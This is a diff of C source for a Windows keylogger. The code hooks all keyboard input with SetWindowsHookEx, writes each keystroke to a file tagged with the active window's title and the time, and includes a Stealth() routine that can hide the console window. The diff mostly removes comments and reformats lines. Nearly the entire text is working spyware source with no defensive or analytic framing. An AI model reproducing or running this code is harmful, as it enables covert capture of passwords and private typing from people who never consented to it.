@@ -4,36 +4,27 @@
 #include <windows.h>
 #include <winuser.h>
 
-// defines whether the window is visible or not
-#define visible // (visible / invisible)
 
-// variable to store the hadnler of the hook
+#define visible
+
 HHOOK _hook;
 KBDLLHOOKSTRUCT kbdStruct;
 
 int Save(int key_stroke);
 FILE *OUTPUT_FILE;
 
-// saves the last window title
 char lastwindow[256];
 
-// callback function for hooks
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
-    // checks if the action hook is valid and the button is pressed
-    if (nCode >= 0 && wParam == WM_KEYDOWN) {
-
-        // get information about the pressed button
+    if (nCode >= 0 && wParam == WM_KEYDOWN) {\
         kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-
-        // saves the button information to a file
         Save(kbdStruct.vkCode);
     }
 
-    // continue to the next hook
     return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
-// initialize the hook
+
 void SetHook() 
 {
     if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
@@ -42,19 +33,16 @@ void SetHook()
     }
 }
 
-// remove hook
-void ReleaseHook() {
+
+void ReleaseHook()
+{
     UnhookWindowsHookEx(_hook); 
 }
 
-// saves keystrokes to a file
+
 int Save(int key_stroke)
 {
-
-    // buffer for window titles
     char lastwindow[256];
-
-    // ignoring mouse clicks
     if ((key_stroke == 1) || (key_stroke == 2)) return 0;
 
     HWND foreground = GetForegroundWindow();
@@ -63,42 +51,30 @@ int Save(int key_stroke)
 
     if (foreground) 
     {
-        // get the thread ID of the active window
         threadID = GetWindowThreadProcessId(foreground, NULL);
-
-        // get the keyboard layout from the thread
         layout = GetKeyboardLayout(threadID);
     }
 
     if (foreground)
     {
         char window_title[256];
-
-        // get the window title
         GetWindowText(foreground, window_title, sizeof(window_title));
 
-        // if the window title changes
         if (strcmp(window_title, lastwindow) != 0)
         {
-
-            // saves the new window title
             strcpy(lastwindow, window_title);
 
-            // get time
             time_t t = time(NULL);
             struct tm *tm = localtime(&t);
             char s[64];
             strftime(s, sizeof(s), "%c", tm);
 
-            // writes the window title and time to a file
             fprintf(OUTPUT_FILE, "\n\n[Window: %s - at %s] ", window_title, s);
         }
     }
 
-    // displays the button code in the console
     printf("%d\n", key_stroke);
 
-    // saves the button representation to a file
     if (key_stroke == VK_BACK)
         fprintf(OUTPUT_FILE, "[BACKSPACE]");
     else if (key_stroke == VK_RETURN)
@@ -134,8 +110,6 @@ int Save(int key_stroke)
     else 
     {
         char key;
-
-        // check capslock status
         boolean lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
 
         if (
@@ -144,10 +118,7 @@ int Save(int key_stroke)
             (GetKeyState(VK_RSHIFT) & 0x1000) != 0
         ) lowercase = !lowercase;
 
-        // change key stroke code into characters
         key = MapVirtualKeyExA(key_stroke, MAPVK_VK_TO_CHAR, layout);
-
-        // change characters to lowercase
         if (!lowercase) key = tolower(key);
 
         fprintf(OUTPUT_FILE, "%c", key);
@@ -159,12 +130,10 @@ int Save(int key_stroke)
 
 void Stealth() {
     #ifdef visible
-        // display window
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1);
     #endif
 
     #ifdef invisible
-        // hide the window
         ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
     #endif
 }
